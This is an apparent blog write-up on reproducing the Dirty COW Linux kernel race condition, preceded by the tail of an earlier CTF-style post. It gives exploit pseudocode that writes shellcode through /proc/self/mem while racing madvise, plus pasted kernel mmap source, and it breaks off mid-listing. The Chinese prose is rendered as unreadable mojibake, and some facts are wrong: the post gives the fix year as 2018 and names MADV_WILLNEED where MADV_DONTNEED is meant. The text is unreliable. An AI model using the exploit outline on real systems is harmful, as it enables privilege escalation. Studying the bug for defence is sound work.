<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">‚ûú  <span class="built_in">exp</span> ./read           </span><br><span class="line">Reading from passed fd <span class="number">5</span></span><br><span class="line">flag&#123;yhellow&#125;</span><br><span class="line">Reading from passed fd <span class="number">6</span></span><br><span class="line">flag&#123;yhellow&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Âú® <code>send</code> Á®ãÂ∫è‰∏≠ÊâìÂºÄÁöÑ‰∏§‰∏™Êñá‰ª∂ <code>flag flag2</code> Ë¢´ËøÅÁßªÂà∞‰∫Ü <code>read</code> Á®ãÂ∫è‰∏≠</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/22/Kernel%20%E7%8E%B0%E5%AE%9E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9ADirty%20Cow/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PwnËøõ‰Ω†ÁöÑÂøÉ">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/22/Kernel%20%E7%8E%B0%E5%AE%9E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9ADirty%20Cow/" class="post-title-link" itemprop="url">Kernel Áé∞ÂÆûÊºèÊ¥ûÂ§çÁé∞ÔºöDirty Cow</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-11-22 19:05:20" itemprop="dateCreated datePublished" datetime="2022-11-22T19:05:20+08:00">2022-11-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-02-26 01:45:16" itemprop="dateModified" datetime="2024-02-26T01:45:16+08:00">2024-02-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>18k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>17 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Dirty Cow ÊºèÊ¥ûÊàêÂõ†</strong></p>
<p>Dirty COW ÊºèÊ¥ûÊòØ‰∏ÄÁßçÂèëÁîüÂú®ÂÜôÊó∂Â§çÂà∂ Copy-On-Write ÁöÑÊù°‰ª∂Á´û‰∫âÊºèÊ¥û</p>
<ul>
<li>Ëá™2007Âπ¥9Êúà <code>linux kernel-2.6.22</code> Ë¢´ÂºïÂÖ•ÔºåÁõ¥Âà∞2018Âπ¥ <code>linux kernel 4.8.3, 4.7.9, 4.4.26</code> ‰πãÂêéÊâçË¢´ÂΩªÂ∫ï‰øÆÂ§ç</li>
</ul>
<p>ÂÜôÊó∂Â§çÂà∂Ôºö</p>
<ul>
<li>‰ΩøÁî® <code>fork</code> Á≥ªÁªüË∞ÉÁî®ÂàõÂª∫Â≠êËøõÁ®ãÔºåÈÇ£‰πàËøô‰∏™Â≠êËøõÁ®ãÈÄöËøá‰ΩøÈ°µË°®Êù°ÁõÆÊåáÂêëÁõ∏ÂêåÁöÑÁâ©ÁêÜÂÜÖÂ≠òÊù•ÂÖ±‰∫´Áà∂ËøõÁ®ãÂÜÖÂ≠ò</li>
<li>ÂΩì‰ªª‰ΩïËøõÁ®ãËØïÂõæÂÜôÂÖ•ÂÜÖÂ≠òÊó∂Ôºå‰ºöÂºïÂèëÂºÇÂ∏∏ÔºåOS Â∞Ü‰∏∫Â≠êËøõÁ®ãÂàÜÈÖçÊñ∞ÁöÑÁâ©ÁêÜÂÜÖÂ≠òÔºå‰ªéÁà∂ËøõÁ®ãÂ§çÂà∂ÂÜÖÂÆπÔºåÊõ¥ÊîπÊØè‰∏™ËøõÁ®ãÁöÑÈ°µË°®‰ΩøÂÆÉÊåáÂêëËá™Â∑±ÁöÑÁßÅÊúâÂÜÖÂ≠òÂâØÊú¨</li>
<li>ÂÖ∂Âü∫Êú¨ÂéüÁêÜ‰∏∫Ôºö‰øÆÊîπÁà∂È°µÈù¢‰∏∫‰∏çÂèØÂÜôÔºà‰∏çÁÆ°‰πãÂâçÊòØ‰ªÄ‰πàÊùÉÈôêÔºâÔºåÂΩìÁ®ãÂ∫èÂ∞ùËØïÂæÄËØ•È°µ‰∏≠ÂÜôÂÖ•Êï∞ÊçÆÊó∂ÔºåÁ®ãÂ∫èÂ∞±‰ºöËß¶ÂèëÈ°µ‰∏≠Êñ≠ÔºåÁÑ∂ÂêéÊ†πÊçÆÊ†áÂøó‰ΩçÊù•Âà§Êñ≠È°µ‰∏≠Êñ≠ÂéüÂõ†‰∏∫ COWÔºå‰πãÂêéÂ∞±Ë∞ÉÁî®ÂØπÂ∫îÁöÑÂáΩÊï∞Êù•ÂàÜÈÖç COW È°µÔºåÂπ∂Âª∫Á´ã COW È°µË°®È°π</li>
</ul>
<p>Êù°‰ª∂Á´û‰∫âÔºö</p>
<ul>
<li>‰∏Ä‰∏™Á≥ªÁªüÊàñËÄÖËøõÁ®ãÁöÑËæìÂá∫Ôºå‰æùËµñ‰∫é‰∏çÂèóÊéßÂà∂ÁöÑ‰∫ã‰ª∂Âá∫Áé∞È°∫Â∫èÔºåÊàñËÄÖÂá∫Áé∞Êó∂Êú∫</li>
<li>Âú®Â§ö‰∏™ËøõÁ®ãÔºàÁ∫øÁ®ãÔºâÂêåÊó∂ËÆøÈóÆÂíåÊìç‰ΩúÁõ∏ÂêåÁöÑÊï∞ÊçÆÊó∂ÔºåËÆøÈóÆÁöÑÈ°∫Â∫èÂèØËÉΩ‰∏éÈ¢ÑÊúüÊúâÂ∑ÆÂà´ÔºåËøôÂ∞ÜÈÄ†ÊàêËæÉ‰∏∫‰∏•ÈáçÁöÑÂÆâÂÖ®ÈóÆÈ¢ò</li>
</ul>
<p>COW ÊâßË°åËøáÁ®ãÊâßË°å‰∏â‰∏™ÈáçË¶ÅÊ≠•È™§Ôºö</p>
<ul>
<li>Âà∂‰ΩúÊò†Â∞ÑÂÜÖÂ≠òÁöÑÂâØÊú¨</li>
<li>Êõ¥Êñ∞È°µË°®Ôºå‰ΩøËôöÊãüÂÜÖÂ≠òÊåáÂêëÊñ∞ÂàõÂª∫ÁöÑÁâ©ÁêÜÂú∞ÂùÄ</li>
<li>ÂÜôÂÖ•ÂÜÖÂ≠ò</li>
</ul>
<p>Áî±‰∫é‰∏â‰∏™Ê≠•È™§‰∏çÊòØÂéüÂ≠êÊÄßÁöÑÔºå‰∏Ä‰∏™Á∫øÁ®ãÂú®ÊâßË°åËøô‰∏â‰∏™Ê≠•È™§ËøáÁ®ã‰∏≠ÂèØËÉΩË¢´ÂÖ∂‰ªñÁ∫øÁ®ã‰∏≠Êñ≠Ôºå‰ªéËÄå‰∫ßÁîüÊΩúÂú®ÁöÑÁ´ûÊÄÅÊù°‰ª∂</p>
<p><strong>Dirty Cow ÊºèÊ¥ûÂà©Áî®</strong></p>
<p>Dirty Cow ÁöÑÂà©Áî®ÈúÄË¶Å‰∏§‰∏™Á≥ªÁªüË∞ÉÁî®Ôºö</p>
<ul>
<li><code>mmap</code>ÔºöÂ∞Ü‰∏Ä‰∏™Êñá‰ª∂ÊàñËÄÖÂÖ∂ÂÆÉÂØπË±°Êò†Â∞ÑÂà∞ËøõÁ®ãÁöÑÂú∞ÂùÄÁ©∫Èó¥</li>
<li><code>madvise</code>ÔºöÂª∫ËÆÆÂÜÖÊ†∏Â¶Ç‰Ωï‰ΩøÁî®ÊåáÂÆöÊÆµÁöÑÂÜÖÂ≠òÔºàÂΩìÂèÇÊï∞ËÆæÁΩÆ‰∏∫ <code>MADV_WILLNEED</code> Êó∂ÔºåÂÜÖÊ†∏Â∞ÜÈáäÊîæÊéâËøô‰∏ÄÂùóÂÜÖÂ≠ò‰ª•ËäÇÁúÅÁ©∫Èó¥ÔºåÁõ∏Â∫îÁöÑÈ°µË°®È°π‰πü‰ºöË¢´ÁΩÆÁ©∫Ôºâ</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/dirtycow/dirtycow.github.io</span><br></pre></td></tr></table></figure>
<p>‰º™‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Main:</span><br><span class="line">    fd = open(filename, O_RDONLY)</span><br><span class="line">    fstat(fd, &amp;st)</span><br><span class="line">    <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, st.st_size , PROT_READ, MAP_PRIVATE, fd, <span class="number">0</span>) </span><br><span class="line">    start Thread1</span><br><span class="line">    start Thread2</span><br><span class="line">    </span><br><span class="line">Thread1Ôºö</span><br><span class="line">    f = open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">        lseek(f, <span class="built_in">map</span>, SEEK_SET);</span><br><span class="line">        write(f, shellcode, <span class="built_in">strlen</span>(shellcode));</span><br><span class="line">        </span><br><span class="line">Thread2Ôºö</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">        madvise(<span class="built_in">map</span>, <span class="number">100</span>, MADV_DONTNEED);</span><br></pre></td></tr></table></figure>
<ul>
<li>‰∏ªÁ∫øÁ®ãÊâìÂºÄÁõÆÊ†áÊñá‰ª∂ÔºåÂπ∂‰∏îÊääËØ•Êñá‰ª∂Êò†Â∞ÑÂà∞ÂÜÖÂ≠òÔºàÈùûÂåøÂêçÊò†Â∞ÑÔºâ</li>
<li>Thread1 Âæ™ÁéØÂêëÂÜôÂÖ• <code>map</code> ‰∏≠ÂÜôÂÖ•Êï∞ÊçÆ</li>
<li>Thread2 Âæ™ÁéØÂØπ <code>map</code> Ëß£Èô§Êò†Â∞Ñ</li>
</ul>
<p>Êé•‰∏ãÊù•Â∞±ËØ¶ÁªÜÂàÜÊûê‰∏Ä‰∏ãËøô‰∏™ËøáÁ®ãÔºöÔºàÂÜÖÊ†∏ÁâàÊú¨‰∏∫Ôºö4.1.4Ôºâ</p>
<p>Áî®Êà∑ÊÄÅ <code>mmap</code> Âú®ÂÜÖÊ†∏‰∏≠ÂØπÂ∫îÁöÑÂáΩÊï∞‰∏∫ <code>sys_mmap</code>ÔºåÂÖ∂Ê†∏ÂøÉÂáΩÊï∞‰∏∫ <code>do_mmap_pgoff</code>Ôºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">do_mmap_pgoff</span><span class="params">(struct file *file, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">unsigned</span> <span class="keyword">long</span> prot,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">unsigned</span> <span class="keyword">long</span> flags, <span class="keyword">unsigned</span> <span class="keyword">long</span> pgoff,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">unsigned</span> <span class="keyword">long</span> *populate)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">	<span class="keyword">vm_flags_t</span> vm_flags;</span><br><span class="line"></span><br><span class="line">	*populate = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Does the application expect PROT_READ to imply PROT_EXEC?</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * (the exception is when the underlying filesystem is noexec</span></span><br><span class="line"><span class="comment">	 *  mounted, in which case we dont add PROT_EXEC.)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((prot &amp; PROT_READ) &amp;&amp; (current-&gt;personality &amp; READ_IMPLIES_EXEC))</span><br><span class="line">		<span class="keyword">if</span> (!(file &amp;&amp; (file-&gt;f_path.mnt-&gt;mnt_flags &amp; MNT_NOEXEC)))</span><br><span class="line">			prot |= PROT_EXEC;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!len)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(flags &amp; MAP_FIXED))</span><br><span class="line">		addr = round_hint_to_min(addr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Careful about overflows.. */</span></span><br><span class="line">	len = PAGE_ALIGN(len);</span><br><span class="line">	<span class="keyword">if</span> (!len)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* offset overflow? */</span></span><br><span class="line">	<span class="keyword">if</span> ((pgoff + (len &gt;&gt; PAGE_SHIFT)) &lt; pgoff)</span><br><span class="line">		<span class="keyword">return</span> -EOVERFLOW;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Too many mappings? */</span></span><br><span class="line">	<span class="keyword">if</span> (mm-&gt;map_count &gt; sysctl_max_map_count)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Obtain the address to map to. we verify (or select) it and ensure</span></span><br><span class="line"><span class="comment">	 * that it represents a valid section of the address space.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	addr = get_unmapped_area(file, addr, len, pgoff, flags); <span class="comment">/* Ëé∑Âèñ‰∏ÄÊÆµÂΩìÂâçËøõÁ®ãÊú™Ë¢´‰ΩøÁî®ÁöÑËôöÊãüÂú∞ÂùÄÁ©∫Èó¥,Âπ∂ËøîÂõûÂÖ∂Ëµ∑ÂßãÂú∞ÂùÄ */</span></span><br><span class="line">	<span class="keyword">if</span> (addr &amp; ~PAGE_MASK)</span><br><span class="line">		<span class="keyword">return</span> addr;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Do simple checking here so the lower-level routines won&#x27;t have</span></span><br><span class="line"><span class="comment">	 * to. we assume access permissions have been handled by the open</span></span><br><span class="line"><span class="comment">	 * of the memory object, so we don&#x27;t do any here.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	vm_flags = calc_vm_prot_bits(prot) | calc_vm_flag_bits(flags) |</span><br><span class="line">			mm-&gt;def_flags | VM_MAYREAD | VM_MAYWRITE | VM_MAYEXEC;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; MAP_LOCKED)</span><br><span class="line">		<span class="keyword">if</span> (!can_do_mlock())</span><br><span class="line">			<span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mlock_future_check(mm, vm_flags, len))</span><br><span class="line">		<span class="keyword">return</span> -EAGAIN;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (file) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> file_inode(file);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span> (flags &amp; MAP_TYPE) &#123;</span><br><span class="line">		<span class="keyword">case</span> MAP_SHARED: <span class="comment">/* ÂÖ±‰∫´Êò†Â∞Ñ */</span></span><br><span class="line">			<span class="keyword">if</span> ((prot&amp;PROT_WRITE) &amp;&amp; !(file-&gt;f_mode&amp;FMODE_WRITE))</span><br><span class="line">				<span class="keyword">return</span> -EACCES;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Make sure we don&#x27;t allow writing to an append-only</span></span><br><span class="line"><span class="comment">			 * file..</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> (IS_APPEND(inode) &amp;&amp; (file-&gt;f_mode &amp; FMODE_WRITE))</span><br><span class="line">				<span class="keyword">return</span> -EACCES;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Make sure there are no mandatory locks on the file.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> (locks_verify_locked(file))</span><br><span class="line">				<span class="keyword">return</span> -EAGAIN;</span><br><span class="line"></span><br><span class="line">			vm_flags |= VM_SHARED | VM_MAYSHARE;</span><br><span class="line">			<span class="keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_WRITE))</span><br><span class="line">				vm_flags &amp;= ~(VM_MAYWRITE | VM_SHARED);</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* fall through */</span></span><br><span class="line">		<span class="keyword">case</span> MAP_PRIVATE: <span class="comment">/* ÁßÅÊúâÂÜÖÂ≠ò */</span></span><br><span class="line">			<span class="keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_READ))</span><br><span class="line">				<span class="keyword">return</span> -EACCES;</span><br><span class="line">			<span class="keyword">if</span> (file-&gt;f_path.mnt-&gt;mnt_flags &amp; MNT_NOEXEC) &#123;</span><br><span class="line">				<span class="keyword">if</span> (vm_flags &amp; VM_EXEC)</span><br><span class="line">					<span class="keyword">return</span> -EPERM;</span><br><span class="line">				vm_flags &amp;= ~VM_MAYEXEC;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!file-&gt;f_op-&gt;mmap)</span><br><span class="line">				<span class="keyword">return</span> -ENODEV;</span><br><span class="line">			<span class="keyword">if</span> (vm_flags &amp; (VM_GROWSDOWN|VM_GROWSUP))</span><br><span class="line">				<span class="keyword">return</span> -EINVAL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">switch</span> (flags &amp; MAP_TYPE) &#123;</span><br><span class="line">		<span class="keyword">case</span> MAP_SHARED:</span><br><span class="line">			<span class="keyword">if</span> (vm_flags &amp; (VM_GROWSDOWN|VM_GROWSUP))</span><br><span class="line">				<span class="keyword">return</span> -EINVAL;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Ignore pgoff.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			pgoff = <span class="number">0</span>;</span><br><span class="line">			vm_flags |= VM_SHARED | VM_MAYSHARE;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> MAP_PRIVATE:</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Set pgoff according to addr for anon_vma.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			pgoff = addr &gt;&gt; PAGE_SHIFT;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Set &#x27;VM_NORESERVE&#x27; if we should not account for the</span></span><br><span class="line"><span class="comment">	 * memory use of this mapping.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; MAP_NORESERVE) &#123;</span><br><span class="line">		<span class="comment">/* We honor MAP_NORESERVE if allowed to overcommit */</span></span><br><span class="line">		<span class="keyword">if</span> (sysctl_overcommit_memory != OVERCOMMIT_NEVER)</span><br><span class="line">			vm_flags |= VM_NORESERVE;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* hugetlb applies strict overcommit unless MAP_NORESERVE */</span></span><br><span class="line">		<span class="keyword">if</span> (file &amp;&amp; is_file_hugepages(file))</span><br><span class="line">			vm_flags |= VM_NORESERVE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	addr = mmap_region(file, addr, len, vm_flags, pgoff); <span class="comment">/* ÂÆåÊàêÊò†Â∞ÑËøáÁ®ã */</span></span><br><span class="line">	<span class="keyword">if</span> (!IS_ERR_VALUE(addr) &amp;&amp;</span><br><span class="line">	    ((vm_flags &amp; VM_LOCKED) ||</span><br><span class="line">	     (flags &amp; (MAP_POPULATE | MAP_NONBLOCK)) == MAP_POPULATE))</span><br><span class="line">		*populate = len;</span><br><span class="line">	<span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>ÂâçÈù¢Â∞±ÊòØÊ†πÊçÆ <code>flags</code> ‰∏≠ÁöÑÊ†áÂøó‰ΩçËøõË°å‰∏Ä‰∫õËÆæÁΩÆ</li>
<li>ÂêéÈù¢ËøõÂÖ• <code>mmap_region</code> ÂáΩÊï∞ÂÆåÊàêÊò†Â∞Ñ</li>
<li>ÂÄºÂæóÊ≥®ÊÑèÁöÑ‰∏ÄÁÇπÊòØÔºöÂ¶ÇÊûúÊ≤°ÊúâËÆæÁΩÆ <code>flag=MAP_POPULATE</code>ÔºàÊèêÂâçÂª∫Á´ãÈ°µË°®ÁöÑÊ†áÂøó‰ΩçÔºâÔºåÊòØ‰∏ç‰ºöÂª∫Á´ãÈ°µË°®È°πÁöÑ</li>
<li>‰πüÂ∞±ÊòØËØ¥ÔºåÂΩìÂêéÁª≠ÁöÑ <code>write</code> ËØªÂèñËØ• VMA ÂØπÂ∫îÁöÑÂú∞ÂùÄÁ©∫Èó¥Êó∂Ôºå‰ºöËß¶ÂèëÁº∫È°µÂºÇÂ∏∏ <code>page_fault</code></li>
</ul>
<p><code>page_fault</code> ÂèØËÉΩÊúâÂ§öÁßçÂéüÂõ†Ôºö</p>
<ul>
<li>ËÆøÈóÆÂú∞ÂùÄ‰∏çÂú®ËôöÊãüÂú∞ÂùÄÁ©∫Èó¥</li>
<li>ËÆøÈóÆÂú∞ÂùÄÂú®ËôöÊãüÂú∞ÂùÄÁ©∫Èó¥‰∏≠Ôºå‰ΩÜÊ≤°ÊúâËÆøÈóÆÊùÉÈôê</li>
<li>ËÆøÈóÆÂú∞ÂùÄÂú®ËôöÊãüÂú∞ÂùÄÁ©∫Èó¥‰∏≠Ôºå‰ΩÜÊ≤°Êúâ‰∏éÁâ©ÁêÜÂú∞ÂùÄÈó¥Âª∫Á´ãÊò†Â∞ÑÂÖ≥Á≥ª</li>
</ul>
<p>Linux ÂÜÖÊ†∏ÂÖ≥‰∫é <code>page_fault</code> ÁöÑÂ§ÑÁêÜÊòØÈÄöËøá‰∏ÄÁ≥ªÂàóÁ≥ªÁªüË∞ÉÁî®ÂáΩÊï∞ÂÆûÁé∞ÁöÑÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">do_page_fault() -&gt; handle_mm_fault() -&gt; handle_pte_fault() -&gt; do_fault()</span><br></pre></td></tr></table></figure>
<ul>
<li><code>do_page_fault</code>Ôºö‰ºöÊ£ÄÊü•Â§öÁßçÂºÇÂ∏∏ÂéüÂõ†ÔºåÊØîÂ¶ÇÁº∫È°µÂºÇÂ∏∏ÁöÑÂú∞ÂùÄÂú®ÂÜÖÊ†∏Á©∫Èó¥ËøòÊòØÁî®Êà∑Á©∫Èó¥ÔºåÊòØÂÜÖÊ†∏ÊÄÅËøòÊòØÁî®Êà∑ÊÄÅËß¶ÂèëÁöÑÂºÇÂ∏∏Á≠âÁ≠âÊÉÖÂÜµ</li>
<li><code>handle_mm_fault</code>Ôºö‰∏∫ÂèëÁîü <code>page_fault</code> ÁöÑÂú∞ÂùÄÂàÜÈÖçÂêÑÁ∫ßÈ°µË°®ÁõÆÂΩï</li>
<li><code>handle_pte_fault</code>Ôºö‰ªé‰∏äÂ±ÇÂáΩÊï∞ÂæóÂà∞‰∫ÜÁº∫È°µÂºÇÂ∏∏ÁöÑ <code>pte</code>ÔºàÈ°µË°®È°πÔºâÔºåÁÑ∂ÂêéÂÅöÂ§öÂ±ÇÊ£ÄÊü•</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 